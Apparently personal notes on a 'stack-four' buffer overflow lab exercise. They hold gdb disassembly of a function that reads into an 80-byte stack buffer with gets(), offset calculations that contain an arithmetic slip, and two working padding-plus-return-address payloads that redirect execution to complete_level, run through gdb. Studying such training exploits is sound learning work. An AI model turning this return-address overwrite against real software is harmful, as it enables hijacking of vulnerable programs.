```
0x000000000040068d default return to main+35
0x000000000040061d complete_level+0
0x0000000000400615 complete_level-8 (13-8 = 5)
0x00007fffffffe570 rbp from caller

push -8
subq 0x50/80

total pushed stack = 88 % 16 = 88

   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50

   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>

   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]

   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>

   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave
   0x0000000000400669 <+52>:    ret

racikan
first try, with size 80:
$'\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x15\x06\x40'

second try, with size 88:
$'\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x1d\x06\x40'

you can try store the payload the file and use it in gdb:
printf your_paylod > filename.bin
gdb ./stack-four
gef> r < filename.bin
```